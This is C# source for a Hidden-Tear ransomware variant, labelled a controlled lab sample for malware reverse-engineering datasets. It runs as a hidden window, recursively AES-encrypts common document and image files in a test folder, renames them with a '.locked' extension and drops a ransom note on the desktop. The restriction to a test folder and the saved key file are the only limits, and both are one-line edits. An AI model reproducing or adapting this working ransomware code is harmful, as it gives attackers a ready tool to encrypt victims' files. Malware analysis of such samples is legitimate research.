// Hidden-Tear Ransomware Variant with Local Encryption and Coercion via Ransomnote

using System;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;

namespace A01_2_Ransomware_Encrypt_and_Coerce
{
    public
        partial class Form1 : Form
    {
        string userName = Environment.UserName;
        string userDir = "C:\\Users\\";

        public
            Form1()
        {
            this.Load += new EventHandler(Form1_Load);
            this.Shown += new EventHandler(Form_Shown);

            this.Opacity = 0;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        }

        private
            void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            // starts encryption at form load
            startAction();
        }

        private
            void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
        }

        // AES encryption algorithm
        public
            byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using Aes AES = Aes.Create();

                AES.KeySize = 256;
                AES.BlockSize = 128;
                AES.Mode = CipherMode.CBC;

                byte[] derived = new byte[48];

                Rfc2898DeriveBytes.Pbkdf2(
                    passwordBytes,
                    saltBytes,
                    derived,
                    1000,
                    HashAlgorithmName.SHA256);

                AES.Key = derived[..32];
                AES.IV = derived[32..48];

                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                    cs.Close();
                }

                encryptedBytes = ms.ToArray();
            }

            return encryptedBytes;
        }

        // creates random encryption key
        public
            string GenerateKey(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }


        // Encrypts single file
        public
            void EncryptFile(string file, string password)
        {
            if (file.EndsWith(".locked", StringComparison.OrdinalIgnoreCase))
            {
                return;
            }

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".locked");
        }

        // Encrypts a directory and all its subdirectories
        public
            void EncryptDirectory(string location, string password)
        {

            // extensions to be encrypt
            var validExtensions = new[]{
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]).ToLowerInvariant();
                if (validExtensions.Contains(extension))
                {
                    try
                    {
                        EncryptFile(files[i], password);
                    }
                    catch
                    {
                        // Ignore individual file errors (e.g., locked, read-only, or inaccessible)
                        // so remaining files continue to be processed.
                    }
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                try
                {
                    EncryptDirectory(childDirectories[i], password);
                }
                catch
                {
                    // Ignore inaccessible directories and continue.
                }
            }
        }

        // Starts the encryption process
        public
            void startAction()
        {
            string password = GenerateKey(15);
            string keyPath = @"C:\Users\Public\A01_2_Lab_Encryption_Key.txt";
            System.IO.File.WriteAllText(keyPath, password);
            string startPath = @"C:\Users\Public\A01_TestData";

            if (Directory.Exists(startPath))
            {
                EncryptDirectory(startPath, password);
            }
            messageCreator();
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        public
            void messageCreator()
        {
            string path = @"\Desktop\READ_IT.txt";
            string fullpath = userDir + userName + path;
            string[] lines =
            {
                "A01_2 controlled ransomware/coercion sample.",
                "Files in C:\\Users\\Public\\A01_TestData have been encrypted.",
                "This note is generated for malware reverse-engineering dataset analysis.",
                "No payment is required. Use the lab key file to decrypt test files."
            };
            System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}